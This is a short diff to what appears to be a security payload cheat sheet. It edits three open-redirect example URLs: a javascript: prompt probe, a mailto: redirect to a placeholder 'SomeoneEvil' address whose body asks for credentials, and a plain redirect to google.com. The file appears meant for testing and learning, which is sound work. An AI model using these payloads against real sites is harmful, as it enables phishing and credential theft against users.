@@ -12,8 +12,8 @@ These information shall only be used to expand knowledge and not for causing mal
 Open Redirect
 ==============
 
-/?SomeParam=https://TheDomainYouAreOne&TheirParam=javascript://prompt(1)
+/?SomeRandomParam=https://TheDomainYouAreOn&TheirParam=javascript://prompt(1)
 
-/?SomeParam=https://TheDomainYouAreOne&TheirParam=mailto://SomeoneEvil@SOMEDOMAIN?Subject=How about that!%26Body=Please send me credentials
+/?SomeRandomParam=https://TheDomainYouAreOn&TheirParam=mailto://SomeoneEvil@SOMEDOMAIN?Subject=How about that!%26Body=Please send me credentials
 
-/?SomeParam=https://TheDomainYouAreOne&TheirParam=https://www.google.com
+/?SomeRandomParam=https://TheDomainYouAreOn&TheirParam=https://www.google.com
